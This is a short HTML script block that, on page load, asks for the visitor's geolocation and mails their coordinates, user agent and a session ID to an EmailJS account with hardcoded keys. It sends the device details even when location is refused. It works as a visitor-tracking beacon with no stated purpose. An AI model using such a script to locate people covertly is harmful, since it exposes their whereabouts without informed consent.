<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
emailjs.init("htX2_6oDOj4VqH1pD"); // PUBLIC KEY

function generateSessionID() {
    return "SESSION-" + Math.random().toString(36).substring(2, 10).toUpperCase();
}

const sessionID = generateSessionID();

function deviceInfo() {
    return navigator.userAgent;
}

function sendSignal(position) {
    console.log("Invio segnale...");

    const data = {
        session_id: sessionID,
        user_agent: deviceInfo(),
        timestamp: new Date().toLocaleString(),
        lat: position?.coords?.latitude || "NEGATA",
        lon: position?.coords?.longitude || "NEGATA",
        accuracy: position?.coords?.accuracy || "N/A"
    };

    console.log("Dati inviati:", data);

    emailjs.send(
        "service_qf5owhx",
        "template_signal",
        data,
        "htX2_6oDOj4VqH1pD" // ðŸ”¥ OBBLIGATORIA QUI
    )
    .then(() => console.log("Segnale inviato!"))
    .catch(err => console.error("Errore invio:", err));
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            console.log("Posizione ottenuta:", pos);
            sendSignal(pos);
        },
        err => {
            console.warn("Geolocalizzazione negata:", err);
            sendSignal(null);
        }
    );
} else {
    console.warn("Geolocalizzazione non supportata.");
    sendSignal(null);
}
</script>

